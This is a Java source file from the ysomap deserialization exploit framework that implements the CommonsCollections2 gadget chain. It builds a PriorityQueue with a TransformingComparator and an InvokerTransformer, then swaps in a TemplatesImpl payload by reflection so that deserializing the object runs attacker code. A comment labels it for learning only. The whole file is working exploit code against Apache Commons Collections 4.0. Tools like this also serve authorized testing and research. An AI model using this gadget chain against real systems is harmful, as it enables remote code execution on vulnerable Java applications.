package ysomap.payloads.java.commons.collection_v4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.util.PriorityQueue;
import java.util.Queue;

/**
 * 仅供学习，实战不建议
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes","unchecked"})
//@Payloads
@Targets({Targets.JDK})
@Authors({ Authors.FROHOFF })
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Deprecated
public class CommonsCollections2 extends AbstractPayload<Queue<Object>> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Queue<Object> pack(Object obj) throws Exception {
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
        queueArray[0] = obj;// arm bullet
        queueArray[1] = 1;

        return queue;
    }

}
